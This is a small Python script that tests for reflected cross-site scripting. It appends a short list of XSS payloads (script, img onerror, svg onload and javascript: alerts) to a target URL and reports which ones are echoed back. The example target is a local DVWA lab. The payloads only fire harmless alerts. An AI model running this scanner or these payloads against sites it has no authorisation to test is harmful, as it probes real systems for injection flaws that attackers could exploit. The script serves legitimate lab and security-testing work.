import requests
import urllib.parse

def test_xss(url, payload):
    # Encode the payload to handle special characters in URLs
    encoded_payload = urllib.parse.quote(payload)
    full_url = url + encoded_payload
    try:
        response = requests.get(full_url)
        if payload in response.text:
            print(f"Potential XSS found with payload: {payload}")
            print(f"  URL: {full_url}")
        else:
            print(f"No XSS found with payload: {payload}")
    except requests.RequestException as e:
        print(f"Error testing {full_url}: {e}")

def main():
    # Allow user to input the target URL
    base_url = input("Enter the target URL (e.g., http://localhost/dvwa/vulnerabilities/xss_r/?name=): ")

    # Verify if the URL is valid
    if not base_url.startswith(('http://', 'https://')):
        print("Invalid URL. Please include http:// or https://")
        return

    # Allow user to choose default payloads or enter custom ones
    use_default = input("Use default payloads? (y/n): ").lower() == 'y'

    if use_default:
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
    else:
        payloads = []
        while True:
            payload = input("Enter a payload (or press Enter to finish): ")
            if payload == "":
                break
            payloads.append(payload)

    # Run the tests
    print("\nTesting for XSS vulnerabilities...")
    for payload in payloads:
        test_xss(base_url, payload)

if __name__ == "__main__":
    main()
